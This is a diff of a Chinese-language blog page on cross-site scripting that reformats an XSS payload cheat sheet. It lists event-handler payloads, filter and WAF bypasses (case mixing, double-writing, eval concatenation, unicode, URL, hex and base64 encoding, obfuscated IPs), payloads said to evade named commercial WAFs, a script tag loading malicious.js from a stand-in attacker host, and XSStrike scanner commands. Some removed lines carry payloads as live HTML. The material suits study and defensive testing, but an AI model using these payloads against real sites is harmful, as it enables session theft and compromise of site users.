@@ -526,74 +526,95 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=alert(1)&gt;&lt;/select</span><br></pre></td></tr></table></figure>
 通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=alert(1) autofocus&gt;</span><br><span class="line">···</span><br><span class="line">7.iframe标签</span><br><span class="line">&lt;iframe&gt; 标签会创建包含另外一个文档的内联框架。</span><br></pre></td></tr></table></figure>
-<iframe onload=alert(1);></iframe>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8.video标签</span><br><span class="line">&lt;video&gt; 标签定义视频，比如电影片段或其他视频流。</span><br></pre></td></tr></table></figure>
-<video><source onerror=alert(1)>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">9.dudio标签</span><br><span class="line">&lt;audio&gt; 标签定义声音，比如音乐或其他音频流。</span><br></pre></td></tr></table></figure>
-<audio src=x  onerror=alert(1);>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10.body标签</span><br><span class="line">&lt;body&gt; 标签定义文档的主体。</span><br><span class="line">&lt;body onload=alert(1);&gt;</span><br><span class="line">onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发</span><br></pre></td></tr></table></figure>
-<body
-onscroll=alert(1);><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">11.textarea标签</span><br><span class="line"></span><br><span class="line">&lt;textarea&gt; 标签定义一个多行的文本输入控件。</span><br></pre></td></tr></table></figure>
-<textarea onfocus=alert(1); autofocus>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12.keygen标签</span><br></pre></td></tr></table></figure>
-<keygen autofocus onfocus=alert(1)> //仅限火狐
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">13.marquee标签</span><br></pre></td></tr></table></figure>
-<marquee onstart=alert(1)></marquee> //Chrome不行，火狐和IE都可以
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">14.isindex标签</span><br></pre></td></tr></table></figure>
-<isindex type=image src=1 onerror=alert(1)>//仅限于IE
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#  常见过滤方法</span><br><span class="line">不管是sql注入还是rce等等，都见过了很多的注入方式的绕过等等</span><br><span class="line">1.空格过滤，我们可以使用/来代替空格</span><br></pre></td></tr></table></figure>
-/**/，注释符号绕过；/符号绕过；
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=alert(1) autofocus&gt;</span><br></pre></td></tr></table></figure>
+<p>7.iframe标签</p>
+<iframe> 标签会创建包含另外一个文档的内联框架。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=alert(1);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+8.video标签
+<video> 标签定义视频，比如电影片段或其他视频流。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video&gt;&lt;source onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+9.dudio标签
+<audio> 标签定义声音，比如音乐或其他音频流。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=x  onerror=alert(1);&gt;</span><br></pre></td></tr></table></figure>
+10.body标签
+<body> 标签定义文档的主体。
+<body onload=alert(1);>
+onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body</span><br><span class="line">onscroll=alert(1);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure>
+11.textarea标签
 
-<p>&lt;img&#x2F;src&#x3D;”x”&#x2F;onerror&#x3D;alert(1);&gt;</p>
-<p>也可以：</p>
-<p>&lt;img&#x2F;src&#x3D;”x”onerror&#x3D;alert(1);&gt;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.引号绕过</span><br></pre></td></tr></table></figure>
-<p>如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号：</p>
-<p>&lt;img src&#x3D;x onerror&#x3D;alert(<code>xss</code>);&gt;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3.括号过滤</span><br><span class="line">当括号被过滤的时候可以用throw来绕过。throw语句用于当错误发生时抛出一个错误</span><br></pre></td></tr></table></figure>
-<img src=x onerror="javascript:window.onerror=alert;throw 1">
-<a onmouseover="javascript:window.onerror=alert;throw 1>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4.关键字绕过</span><br><span class="line">(1)大小写绕过</span><br></pre></td></tr></table></figure>
-<sCRiPt>alert(1);</sCrIpT>
-<ImG sRc=x onerRor=alert(1);>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(2)双写绕过</span><br><span class="line">有些waf可能只替换一次为空，这种情况下我们可以考虑双写绕过关键字过滤</span><br></pre></td></tr></table></figure>
-<scrscriptipt>alert(1);</scrscriptipt>
-<imimgg srsrcc=x onerror=alert(1);>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">5.字符串拼接绕过</span><br><span class="line">利用eval函数</span><br><span class="line">与php的eval()函数相同，js的eval函数也可以计算js字符串，并把它当作脚本来执行</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;a=&#x27;aler&#x27;;b=&#x27;t&#x27;;c=&#x27;(1)&#x27;;eval(a+b+c)&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;&gt;</span><br><span class="line">// 在js中，我们可以用反引号代替单双引号</span><br><span class="line">6.编码绕过</span><br></pre></td></tr></table></figure>
-<p>Unicode编码绕过</p>
-<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">
-
-<p>javasc&#x72;&#x69;pt:alert(&#x2F;xss&#x2F;)     (编码了r和i)</p>
-<img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">url编码绕过</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<textarea> 标签定义一个多行的文本输入控件。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea onfocus=alert(1); autofocus&gt;</span><br></pre></td></tr></table></figure>
+12.keygen标签
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</span><br></pre></td></tr></table></figure>
+13.marquee标签
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee onstart=alert(1)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</span><br></pre></td></tr></table></figure>
+14.isindex标签
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;isindex type=image src=1 onerror=alert(1)&gt;//仅限于IE</span><br></pre></td></tr></table></figure>
+#  常见过滤方法
+不管是sql注入还是rce等等，都见过了很多的注入方式的绕过等等
+1.空格过滤，我们可以使用/来代替空格
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/**/，注释符号绕过；/符号绕过；</span><br><span class="line"></span><br><span class="line">&lt;img/src=&quot;x&quot;/onerror=alert(1);&gt;</span><br><span class="line"></span><br><span class="line">也可以：</span><br><span class="line"></span><br><span class="line">&lt;img/src=&quot;x&quot;onerror=alert(1);&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+2.引号绕过
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号：</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=alert(`xss`);&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+3.括号过滤
+当括号被过滤的时候可以用throw来绕过。throw语句用于当错误发生时抛出一个错误
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;</span><br><span class="line">&lt;a onmouseover=&quot;javascript:window.onerror=alert;throw 1&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+4.关键字绕过
+(1)大小写绕过
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRiPt&gt;alert(1);&lt;/sCrIpT&gt;</span><br><span class="line">&lt;ImG sRc=x onerRor=alert(1);&gt;</span><br></pre></td></tr></table></figure>
+(2)双写绕过
+有些waf可能只替换一次为空，这种情况下我们可以考虑双写绕过关键字过滤
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;scrscriptipt&gt;alert(1);&lt;/scrscriptipt&gt;</span><br><span class="line">&lt;imimgg srsrcc=x onerror=alert(1);&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+5.字符串拼接绕过
+利用eval函数
+与php的eval()函数相同，js的eval函数也可以计算js字符串，并把它当作脚本来执行
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;a=&#x27;aler&#x27;;b=&#x27;t&#x27;;c=&#x27;(1)&#x27;;eval(a+b+c)&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;&gt;</span><br><span class="line">// 在js中，我们可以用反引号代替单双引号</span><br></pre></td></tr></table></figure>
+6.编码绕过
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Unicode编码绕过</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;</span><br><span class="line"></span><br><span class="line">javasc&amp;#x72;&amp;#x69;pt:alert(/xss/)     (编码了r和i)</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url编码绕过</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ascii码绕过</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hex绕过</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">base64绕过</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>7.过滤url地址</p>
+7.过滤url地址
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用url编码</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`&gt;</span><br><span class="line"></span><br><span class="line">javasc&amp;#x72;&amp;#x69;pt:alert(&#x27;xsshttp://&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">使用IP</span><br><span class="line"></span><br><span class="line">1.十进制IP</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt;</span><br><span class="line"></span><br><span class="line">2.八进制IP</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://0177.0.0.01/`&gt;</span><br><span class="line"></span><br><span class="line">3.hex</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://0x7f.0x0.0x0.0x1/`&gt;</span><br><span class="line">4.html标签中用//可以代替http://</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt;</span><br><span class="line"></span><br><span class="line">5.使用\\</span><br><span class="line">但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议</span><br><span class="line"></span><br><span class="line">6.使用中文逗号代替英文逗号</span><br><span class="line">如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.location=`http://www。baidu。com`&quot;&gt;//会自动跳转到百度</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>8.单引号闭合+htmlspecialchars函数绕过<br>‘onmouseover&#x3D;’alert(&#x2F;xss&#x2F;)<br>9.js伪协议</p>
+8.单引号闭合+htmlspecialchars函数绕过
+'onmouseover='alert(/xss/)
+9.js伪协议
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(/xss/)&gt;               </span><br><span class="line">o_n和&lt;scr_ipt&gt;过滤</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h1 id="HttpOnly绕过"><a href="#HttpOnly绕过" class="headerlink" title="HttpOnly绕过"></a>HttpOnly绕过</h1><p>1.什么是HttpOnly?</p>
-<p>如果您在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，具体一点的介绍请google进行搜索</p>
-<p>2.javaEE的API是否支持?</p>
-<p>目前sun公司还没有公布相关的API，但PHP、C#均有实现。搞javaEE的兄弟们比较郁闷了，别急下文有变通实现</p>
-<p>3.HttpOnly的设置样例</p>
-<p>javaEE<br>response.setHeader(“Set-Cookie”, “cookiename&#x3D;value;<br>Path&#x3D;&#x2F;;Domain&#x3D;domainvalue;Max-Age&#x3D;seconds;HTTPOnly”);</p>
-<p>具体参数的含义再次不做阐述，设置完毕后通过js脚本是读不到该cookie的，但使用如下方式可以读取<br>Cookie cookies[]&#x3D;request.getCookies();</p>
+# HttpOnly绕过
+1.什么是HttpOnly?
+
+如果您在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，具体一点的介绍请google进行搜索
+
+2.javaEE的API是否支持?
+
+目前sun公司还没有公布相关的API，但PHP、C#均有实现。搞javaEE的兄弟们比较郁闷了，别急下文有变通实现
+
+3.HttpOnly的设置样例
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javaEE</span><br><span class="line">response.setHeader(“Set-Cookie”, “cookiename=value;</span><br><span class="line">Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly”);</span><br></pre></td></tr></table></figure>
+具体参数的含义再次不做阐述，设置完毕后通过js脚本是读不到该cookie的，但使用如下方式可以读取
+Cookie cookies[]=request.getCookies();
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C#</span><br><span class="line">HttpCookie myCookie = new HttpCookie(&quot;myCookie&quot;);</span><br><span class="line">myCookie.HttpOnly = true;</span><br><span class="line">Response.AppendCookie(myCookie);</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">VB.NET</span><br><span class="line">Dim myCookie As HttpCookie = new HttpCookie(&quot;myCookie&quot;)</span><br><span class="line">myCookie.HttpOnly = True</span><br><span class="line">Response.AppendCookie(myCookie)</span><br></pre></td></tr></table></figure>
-<p>但是在 .NET 1.1 ,中您需要手动添加<br>Response.Cookies[cookie].Path +&#x3D; “;HTTPOnly”;<br>PHP4<br>header(“Set-Cookie: hidden&#x3D;value; httpOnly”);<br>PHP5<br>setcookie(“abc”, “test”, NULL, NULL, NULL, NULL, TRUE);<br>最后一个参数为HttpOnly属性</p>
-<h1 id="常规waf绕过思路"><a href="#常规waf绕过思路" class="headerlink" title="常规waf绕过思路"></a>常规waf绕过思路</h1><p>1.标签语法替换</p>
+但是在 .NET 1.1 ,中您需要手动添加
+Response.Cookies[cookie].Path += “;HTTPOnly”;
+PHP4
+header("Set-Cookie: hidden=value; httpOnly");
+PHP5
+setcookie("abc", "test", NULL, NULL, NULL, NULL, TRUE);
+最后一个参数为HttpOnly属性
+# 常规waf绕过思路
+1.标签语法替换
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(&quot;XSS&quot;)&lt;/scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://attacker.org/malicious.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>2.特殊符号干扰<br>3.提交方式更改<br>4.垃圾数据溢出<br>5.加密解密算法<br>6.结合其他漏洞绕过</p>
+2.特殊符号干扰
+3.提交方式更改
+4.垃圾数据溢出
+5.加密解密算法
+6.结合其他漏洞绕过
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WAF名称：Cloudflare</span><br><span class="line">Payload：&lt;a”/onclick=(confirm)()&gt;click</span><br><span class="line">绕过技术：非空格填充</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WAF名称：Wordfence</span><br><span class="line">Payload：&lt;a/href=javascript&amp;colon;alert()&gt;click</span><br><span class="line">绕过技术：数字字符编码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WAF名称：Barracuda</span><br><span class="line">Payload：&lt;a/href=Java%0a%0d%09script&amp;colon;alert()&gt;click</span><br><span class="line">绕过技术：数字字符编码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -601,28 +622,34 @@ onscroll=alert(1);><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WAF名称：F5</span><br><span class="line">Payload：&lt;d3v/onmouseleave=[2].some(confirm)&gt;click</span><br><span class="line">绕过技术：黑名单中缺少事件处理器以及函数调用混淆</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WAF名称：ModSecurity</span><br><span class="line">Payload：&lt;details/open/ontoggle=alert()&gt;</span><br><span class="line">绕过技术：黑名单中缺少标签或事件处理器</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WAF名称：dotdefender</span><br><span class="line">Payload：&lt;details/open/ontoggle=(confirm)()//</span><br><span class="line">绕过技术：黑名单中缺少结束标签、事件处理器和函数调用混淆</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h1 id="10-XSStrike工具使用"><a href="#10-XSStrike工具使用" class="headerlink" title="10.XSStrike工具使用"></a>10.XSStrike工具使用</h1><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a><br>1.测试get方法的网页</p>
+# 10.XSStrike工具使用
+项目地址：https://github.com/s0md3v/XSStrike
+1.测试get方法的网页
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u &quot;http://example.com/search.php?q=query&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>2.测试post参数</p>
+2.测试post参数
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u &quot;http://example.com/search.php&quot; --data &quot;q=query&quot;</span><br><span class="line">python xsstrike.py -u &quot;http://example.com/search.php&quot; --data &#x27;&#123;&quot;q&quot;:&quot;query&quot;&#125; --json&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>3.测试URL路径</p>
+3.测试URL路径
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u &quot;http://example.com/search/form/query&quot; --path</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>4.从目标网页开始搜索目标并进行测试</p>
+4.从目标网页开始搜索目标并进行测试
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u &quot;http://example.com/page.php&quot; --crawl</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>您可以指定爬网的深度,默认2：-l</p>
+您可以指定爬网的深度,默认2：-l
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u &quot;http://example.com/page.php&quot; --crawl -l 3</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>5.如果要测试文件中的URL，或者知识想添加种子进行爬网，则可以使用该-seeds选项</p>
+5.如果要测试文件中的URL，或者知识想添加种子进行爬网，则可以使用该-seeds选项
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py --seeds urls.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>6.查找隐藏的参数<br>通过解析HTML和暴力破解来查找隐藏的参数</p>
+6.查找隐藏的参数
+通过解析HTML和暴力破解来查找隐藏的参数
